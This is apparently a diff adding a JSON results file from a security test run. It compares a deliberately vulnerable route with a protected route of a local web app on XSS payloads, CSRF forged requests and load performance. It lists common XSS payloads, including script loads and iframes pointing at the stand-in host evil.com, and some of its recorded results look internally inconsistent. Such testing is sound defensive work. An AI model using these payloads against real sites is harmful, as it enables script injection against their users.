@@ -1,0 +1,841 @@
+{
+  "timestamp": "2025-11-30T22:26:45.867Z",
+  "summary": {
+    "totalTests": 34,
+    "passed": 34,
+    "failed": 0,
+    "successRate": "100.00"
+  },
+  "xss": {
+    "vulnerable": {
+      "tests": [
+        {
+          "testNumber": 1,
+          "timestamp": "2025-11-30T22:26:54.651Z",
+          "route": "/vulnerable",
+          "payloadName": "Basic Script Tag",
+          "payload": "<script>alert(\"XSS\")</script>",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 2,
+            "isEscaped": false,
+            "hasUnescapedDanger": true,
+            "userContentPreview": "<script>alert(\"XSS\")</script>",
+            "bodyPreview": "<h1>Vulnerable Echo: <script>alert(\"XSS\")</script></h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 2,
+          "timestamp": "2025-11-30T22:26:57.378Z",
+          "route": "/vulnerable",
+          "payloadName": "Script with Alert(1)",
+          "payload": "<script>alert(1)</script>",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 2,
+            "isEscaped": false,
+            "hasUnescapedDanger": true,
+            "userContentPreview": "<script>alert(1)</script>",
+            "bodyPreview": "<h1>Vulnerable Echo: <script>alert(1)</script></h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 3,
+          "timestamp": "2025-11-30T22:27:01.427Z",
+          "route": "/vulnerable",
+          "payloadName": "External Script",
+          "payload": "<script src=\"http://evil.com/xss.js\"></script>",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 1,
+            "isEscaped": false,
+            "hasUnescapedDanger": true,
+            "userContentPreview": "<script src=\"http://evil.com/xss.js\"></script>",
+            "bodyPreview": "<h1>Vulnerable Echo: <script src=\"http://evil.com/xss.js\"></script></h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 4,
+          "timestamp": "2025-11-30T22:27:05.899Z",
+          "route": "/vulnerable",
+          "payloadName": "IMG onerror",
+          "payload": "<img src=x onerror=alert(\"XSS\")>",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 2,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "<img src=\"x\" onerror=\"alert(&quot;XSS&quot;)\">",
+            "bodyPreview": "<h1>Vulnerable Echo: <img src=\"x\" onerror=\"alert(&quot;XSS&quot;)\"></h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 5,
+          "timestamp": "2025-11-30T22:27:09.983Z",
+          "route": "/vulnerable",
+          "payloadName": "Body onload",
+          "payload": "<body onload=alert(1)>",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 2,
+            "isEscaped": false,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "",
+            "bodyPreview": "<h1>Vulnerable Echo: </h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 6,
+          "timestamp": "2025-11-30T22:27:14.064Z",
+          "route": "/vulnerable",
+          "payloadName": "Input onfocus",
+          "payload": "<input onfocus=alert(1) autofocus>",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 2,
+            "isEscaped": false,
+            "hasUnescapedDanger": true,
+            "userContentPreview": "<input onfocus=\"alert(1)\" autofocus=\"\">",
+            "bodyPreview": "<h1>Vulnerable Echo: <input onfocus=\"alert(1)\" autofocus=\"\"></h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 7,
+          "timestamp": "2025-11-30T22:27:16.732Z",
+          "route": "/vulnerable",
+          "payloadName": "SVG onload",
+          "payload": "<svg onload=alert(1)>",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 2,
+            "isEscaped": false,
+            "hasUnescapedDanger": true,
+            "userContentPreview": "<svg onload=\"alert(1)\"></svg>",
+            "bodyPreview": "<h1>Vulnerable Echo: <svg onload=\"alert(1)\"></svg></h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 8,
+          "timestamp": "2025-11-30T22:27:20.814Z",
+          "route": "/vulnerable",
+          "payloadName": "JavaScript Protocol",
+          "payload": "javascript:alert(\"XSS\")",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 1,
+            "isEscaped": false,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "javascript:alert(\"XSS\")",
+            "bodyPreview": "<h1>Vulnerable Echo: javascript:alert(\"XSS\")</h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 9,
+          "timestamp": "2025-11-30T22:27:24.896Z",
+          "route": "/vulnerable",
+          "payloadName": "Anchor href",
+          "payload": "<a href=\"javascript:alert(1)\">Click</a>",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 1,
+            "isEscaped": false,
+            "hasUnescapedDanger": true,
+            "userContentPreview": "<a href=\"javascript:alert(1)\">Click</a>",
+            "bodyPreview": "<h1>Vulnerable Echo: <a href=\"javascript:alert(1)\">Click</a></h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 10,
+          "timestamp": "2025-11-30T22:27:28.980Z",
+          "route": "/vulnerable",
+          "payloadName": "Iframe Injection",
+          "payload": "<iframe src=\"http://evil.com\"></iframe>",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 1,
+            "isEscaped": false,
+            "hasUnescapedDanger": true,
+            "userContentPreview": "<iframe src=\"http://evil.com\"></iframe>",
+            "bodyPreview": "<h1>Vulnerable Echo: <iframe src=\"http://evil.com\"></iframe></h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 11,
+          "timestamp": "2025-11-30T22:27:31.768Z",
+          "route": "/vulnerable",
+          "payloadName": "Object Tag",
+          "payload": "<object data=\"javascript:alert(1)\"></object>",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 1,
+            "isEscaped": false,
+            "hasUnescapedDanger": true,
+            "userContentPreview": "<object data=\"javascript:alert(1)\"></object>",
+            "bodyPreview": "<h1>Vulnerable Echo: <object data=\"javascript:alert(1)\"></object></h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 12,
+          "timestamp": "2025-11-30T22:27:35.846Z",
+          "route": "/vulnerable",
+          "payloadName": "HTML Entities",
+          "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 1,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&lt;script&gt;alert(1)&lt;/script&gt;",
+            "bodyPreview": "<h1>Vulnerable Echo: &lt;script&gt;alert(1)&lt;/script&gt;</h1><script>alert('Inline script runs!')</script>"
+          }
+        },
+        {
+          "testNumber": 13,
+          "timestamp": "2025-11-30T22:27:39.926Z",
+          "route": "/vulnerable",
+          "payloadName": "URL Encoded",
+          "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+          "expectedBehavior": "attack succeeds",
+          "actualBehavior": "attack succeeded",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 1,
+            "isEscaped": false,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "%3Cscript%3Ealert(1)%3C/script%3E",
+            "bodyPreview": "<h1>Vulnerable Echo: %3Cscript%3Ealert(1)%3C/script%3E</h1><script>alert('Inline script runs!')</script>"
+          }
+        }
+      ],
+      "blockRate": "0.00",
+      "total": 13,
+      "blocked": 0,
+      "succeeded": 13,
+      "byCategory": {
+        "basic": {
+          "total": 3,
+          "blocked": 0
+        },
+        "eventHandlers": {
+          "total": 4,
+          "blocked": 0
+        },
+        "javascript": {
+          "total": 2,
+          "blocked": 0
+        },
+        "htmlInjection": {
+          "total": 2,
+          "blocked": 0
+        },
+        "encoding": {
+          "total": 2,
+          "blocked": 0
+        }
+      }
+    },
+    "protected": {
+      "tests": [
+        {
+          "testNumber": 14,
+          "timestamp": "2025-11-30T22:27:44.010Z",
+          "route": "/protected",
+          "payloadName": "Basic Script Tag",
+          "payload": "<script>alert(\"XSS\")</script>",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&lt;script&gt;alert(\"XSS\")&lt;/script&gt;",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 15,
+          "timestamp": "2025-11-30T22:27:48.334Z",
+          "route": "/protected",
+          "payloadName": "Script with Alert(1)",
+          "payload": "<script>alert(1)</script>",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&lt;script&gt;alert(1)&lt;/script&gt;",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 16,
+          "timestamp": "2025-11-30T22:27:52.428Z",
+          "route": "/protected",
+          "payloadName": "External Script",
+          "payload": "<script src=\"http://evil.com/xss.js\"></script>",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&lt;script src=\"http://evil.com/xss.js\"&gt;&lt;/script&gt;",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 17,
+          "timestamp": "2025-11-30T22:27:56.517Z",
+          "route": "/protected",
+          "payloadName": "IMG onerror",
+          "payload": "<img src=x onerror=alert(\"XSS\")>",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&lt;img src=x onerror=alert(\"XSS\")&gt;",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 18,
+          "timestamp": "2025-11-30T22:28:00.616Z",
+          "route": "/protected",
+          "payloadName": "Body onload",
+          "payload": "<body onload=alert(1)>",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&lt;body onload=alert(1)&gt;",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 19,
+          "timestamp": "2025-11-30T22:28:04.715Z",
+          "route": "/protected",
+          "payloadName": "Input onfocus",
+          "payload": "<input onfocus=alert(1) autofocus>",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&lt;input onfocus=alert(1) autofocus&gt;",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 20,
+          "timestamp": "2025-11-30T22:28:08.808Z",
+          "route": "/protected",
+          "payloadName": "SVG onload",
+          "payload": "<svg onload=alert(1)>",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&lt;svg onload=alert(1)&gt;",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 21,
+          "timestamp": "2025-11-30T22:28:12.905Z",
+          "route": "/protected",
+          "payloadName": "JavaScript Protocol",
+          "payload": "javascript:alert(\"XSS\")",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": false,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "javascript:alert(\"XSS\")",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 22,
+          "timestamp": "2025-11-30T22:28:17.002Z",
+          "route": "/protected",
+          "payloadName": "Anchor href",
+          "payload": "<a href=\"javascript:alert(1)\">Click</a>",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&lt;a href=\"javascript:alert(1)\"&gt;Click&lt;/a&gt;",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 23,
+          "timestamp": "2025-11-30T22:28:21.099Z",
+          "route": "/protected",
+          "payloadName": "Iframe Injection",
+          "payload": "<iframe src=\"http://evil.com\"></iframe>",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&lt;iframe src=\"http://evil.com\"&gt;&lt;/iframe&gt;",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 24,
+          "timestamp": "2025-11-30T22:28:25.195Z",
+          "route": "/protected",
+          "payloadName": "Object Tag",
+          "payload": "<object data=\"javascript:alert(1)\"></object>",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": true,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&lt;object data=\"javascript:alert(1)\"&gt;&lt;/object&gt;",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 25,
+          "timestamp": "2025-11-30T22:28:29.282Z",
+          "route": "/protected",
+          "payloadName": "HTML Entities",
+          "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": false,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        },
+        {
+          "testNumber": 26,
+          "timestamp": "2025-11-30T22:28:33.374Z",
+          "route": "/protected",
+          "payloadName": "URL Encoded",
+          "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+          "expectedBehavior": "attack blocked",
+          "actualBehavior": "attack blocked",
+          "passed": true,
+          "details": {
+            "alertsTriggered": 0,
+            "isEscaped": false,
+            "hasUnescapedDanger": false,
+            "userContentPreview": "%3Cscript%3Ealert(1)%3C/script%3E",
+            "bodyPreview": "\n        <div class=\"card\">\n          <div class=\"card-header bg-success text-white\"><h2>Protected Page</h2></div>\n          <div class=\"card-body\">\n            <h1 class=\"alert alert-success\">Safe Ec"
+          }
+        }
+      ],
+      "blockRate": "100.00",
+      "total": 13,
+      "blocked": 13,
+      "succeeded": 0,
+      "byCategory": {
+        "basic": {
+          "total": 3,
+          "blocked": 3
+        },
+        "eventHandlers": {
+          "total": 4,
+          "blocked": 4
+        },
+        "javascript": {
+          "total": 2,
+          "blocked": 2
+        },
+        "htmlInjection": {
+          "total": 2,
+          "blocked": 2
+        },
+        "encoding": {
+          "total": 2,
+          "blocked": 2
+        }
+      }
+    }
+  },
+  "csrf": {
+    "vulnerable": {
+      "tests": [
+        {
+          "testNumber": 1,
+          "timestamp": "2025-11-30T22:28:37.431Z",
+          "route": "/vulnerable",
+          "expectedBehavior": "forged request succeeds",
+          "actualBehavior": "forged request succeeded",
+          "passed": true,
+          "details": {
+            "tokenFound": false,
+            "tokenPreview": "...",
+            "validTokenStatus": 200,
+            "forgedRequestStatus": 200
+          }
+        },
+        {
+          "testNumber": 2,
+          "timestamp": "2025-11-30T22:28:37.478Z",
+          "route": "/vulnerable",
+          "expectedBehavior": "forged request succeeds",
+          "actualBehavior": "forged request succeeded",
+          "passed": true,
+          "details": {
+            "tokenFound": false,
+            "tokenPreview": "...",
+            "validTokenStatus": 200,
+            "forgedRequestStatus": 200
+          }
+        },
+        {
+          "testNumber": 3,
+          "timestamp": "2025-11-30T22:28:37.490Z",
+          "route": "/vulnerable",
+          "expectedBehavior": "forged request succeeds",
+          "actualBehavior": "forged request succeeded",
+          "passed": true,
+          "details": {
+            "tokenFound": false,
+            "tokenPreview": "...",
+            "validTokenStatus": 200,
+            "forgedRequestStatus": 200
+          }
+        },
+        {
+          "testNumber": 4,
+          "timestamp": "2025-11-30T22:28:37.502Z",
+          "route": "/vulnerable",
+          "expectedBehavior": "forged request succeeds",
+          "actualBehavior": "forged request succeeded",
+          "passed": true,
+          "details": {
+            "tokenFound": false,
+            "tokenPreview": "...",
+            "validTokenStatus": 200,
+            "forgedRequestStatus": 200
+          }
+        }
+      ],
+      "blockRate": "0.00",
+      "total": 4,
+      "blocked": 0,
+      "succeeded": 4
+    },
+    "protected": {
+      "tests": [
+        {
+          "testNumber": 5,
+          "timestamp": "2025-11-30T22:28:37.512Z",
+          "route": "/protected",
+          "expectedBehavior": "forged request blocked",
+          "actualBehavior": "forged request blocked",
+          "passed": true,
+          "details": {
+            "tokenFound": true,
+            "tokenPreview": "96e134747d49f1d7...",
+            "validTokenStatus": 403,
+            "forgedRequestStatus": 403
+          }
+        },
+        {
+          "testNumber": 6,
+          "timestamp": "2025-11-30T22:28:37.524Z",
+          "route": "/protected",
+          "expectedBehavior": "forged request blocked",
+          "actualBehavior": "forged request blocked",
+          "passed": true,
+          "details": {
+            "tokenFound": true,
+            "tokenPreview": "9f35f3fa4cd49a65...",
+            "validTokenStatus": 403,
+            "forgedRequestStatus": 403
+          }
+        },
+        {
+          "testNumber": 7,
+          "timestamp": "2025-11-30T22:28:37.534Z",
+          "route": "/protected",
+          "expectedBehavior": "forged request blocked",
+          "actualBehavior": "forged request blocked",
+          "passed": true,
+          "details": {
+            "tokenFound": true,
+            "tokenPreview": "a71f96aeef8be9d6...",
+            "validTokenStatus": 403,
+            "forgedRequestStatus": 403
+          }
+        },
+        {
+          "testNumber": 8,
+          "timestamp": "2025-11-30T22:28:37.544Z",
+          "route": "/protected",
+          "expectedBehavior": "forged request blocked",
+          "actualBehavior": "forged request blocked",
+          "passed": true,
+          "details": {
+            "tokenFound": true,
+            "tokenPreview": "35bcdb6c7890c2a4...",
+            "validTokenStatus": 403,
+            "forgedRequestStatus": 403
+          }
+        }
+      ],
+      "blockRate": "100.00",
+      "total": 4,
+      "blocked": 4,
+      "succeeded": 0
+    }
+  },
+  "performance": {
+    "vulnerable": {
+      "url": "http://localhost:3000/vulnerable",
+      "connections": 50,
+      "sampleInt": 1000,
+      "pipelining": 10,
+      "duration": 15.04,
+      "samples": 15,
+      "start": "2025-11-30T22:28:37.648Z",
+      "finish": "2025-11-30T22:28:52.685Z",
+      "errors": 0,
+      "timeouts": 0,
+      "mismatches": 0,
+      "non2xx": 0,
+      "resets": 0,
+      "1xx": 0,
+      "2xx": 77572,
+      "3xx": 0,
+      "4xx": 0,
+      "5xx": 0,
+      "statusCodeStats": {
+        "200": {
+          "count": 77572
+        }
+      },
+      "latency": {
+        "average": 95.97,
+        "mean": 95.97,
+        "stddev": 35.77,
+        "min": 82,
+        "max": 1416,
+        "p0_001": 82,
+        "p0_01": 83,
+        "p0_1": 83,
+        "p1": 83,
+        "p2_5": 84,
+        "p10": 85,
+        "p25": 87,
+        "p50": 90,
+        "p75": 95,
+        "p90": 108,
+        "p97_5": 137,
+        "p99": 199,
+        "p99_9": 521,
+        "p99_99": 1415,
+        "p99_999": 1416,
+        "totalCount": 77572
+      },
+      "requests": {
+        "average": 5171.54,
+        "mean": 5171.54,
+        "stddev": 797.21,
+        "min": 2341,
+        "max": 5720,
+        "total": 77572,
+        "p0_001": 2341,
+        "p0_01": 2341,
+        "p0_1": 2341,
+        "p1": 2341,
+        "p2_5": 2341,
+        "p10": 4891,
+        "p25": 5019,
+        "p50": 5403,
+        "p75": 5639,
+        "p90": 5651,
+        "p97_5": 5723,
+        "p99": 5723,
+        "p99_9": 5723,
+        "p99_99": 5723,
+        "p99_999": 5723,
+        "sent": 78072
+      },
+      "throughput": {
+        "average": 1546291.2,
+        "mean": 1546291.2,
+        "stddev": 238303.46,
+        "min": 699959,
+        "max": 1710280,
+        "total": 23194028,
+        "p0_001": 700415,
+        "p0_01": 700415,
+        "p0_1": 700415,
+        "p1": 700415,
+        "p2_5": 700415,
+        "p10": 1463295,
+        "p25": 1501183,
+        "p50": 1614847,
+        "p75": 1686527,
+        "p90": 1690623,
+        "p97_5": 1711103,
+        "p99": 1711103,
+        "p99_9": 1711103,
+        "p99_99": 1711103,
+        "p99_999": 1711103
+      }
+    },
+    "protected": {
+      "url": "http://localhost:3000/protected",
+      "connections": 50,
+      "sampleInt": 1000,
+      "pipelining": 10,
+      "duration": 15.01,
+      "samples": 15,
+      "start": "2025-11-30T22:28:52.732Z",
+      "finish": "2025-11-30T22:29:07.746Z",
+      "errors": 0,
+      "timeouts": 0,
+      "mismatches": 0,
+      "non2xx": 0,
+      "resets": 0,
+      "1xx": 0,
+      "2xx": 58274,
+      "3xx": 0,
+      "4xx": 0,
+      "5xx": 0,
+      "statusCodeStats": {
+        "200": {
+          "count": 58274
+        }
+      },
+      "latency": {
+        "average": 127.78,
+        "mean": 127.78,
+        "stddev": 139.59,
+        "min": 8,
+        "max": 3292,
+        "p0_001": 8,
+        "p0_01": 8,
+        "p0_1": 16,
+        "p1": 31,
+        "p2_5": 52,
+        "p10": 90,
+        "p25": 115,
+        "p50": 120,
+        "p75": 130,
+        "p90": 141,
+        "p97_5": 158,
+        "p99": 234,
+        "p99_9": 2728,
+        "p99_99": 3292,
+        "p99_999": 3292,
+        "totalCount": 58274
+      },
+      "requests": {
+        "average": 3885.34,
+        "mean": 3885.34,
+        "stddev": 314.5,
+        "min": 3162,
+        "max": 4439,
+        "total": 58274,
+        "p0_001": 3163,
+        "p0_01": 3163,
+        "p0_1": 3163,
+        "p1": 3163,
+        "p2_5": 3163,
+        "p10": 3491,
+        "p25": 3695,
+        "p50": 3975,
+        "p75": 3989,
+        "p90": 4251,
+        "p97_5": 4439,
+        "p99": 4439,
+        "p99_9": 4439,
+        "p99_99": 4439,
+        "p99_999": 4439,
+        "sent": 58774
+      },
+      "throughput": {
+        "average": 6089796.27,
+        "mean": 6089796.27,
+        "stddev": 492807.35,
+        "min": 4956972,
+        "max": 6958557,
+        "total": 91351876,
+        "p0_001": 4960255,
+        "p0_01": 4960255,
+        "p0_1": 4960255,
+        "p1": 4960255,
+        "p2_5": 4960255,
+        "p10": 5476351,
+        "p25": 5791743,
+        "p50": 6230015,
+        "p75": 6254591,
+        "p90": 6664191,
+        "p97_5": 6959103,
+        "p99": 6959103,
+        "p99_9": 6959103,
+        "p99_99": 6959103,
+        "p99_999": 6959103
+      }
+    },
+    "comparison": {
+      "latencyIncrease": "33.15%",
+      "latencyIncreaseMs": "31.81ms",
+      "throughputDecrease": "-293.83%",
+      "requestsPerSecDecrease": "24.87%"
+    }
+  }
+}
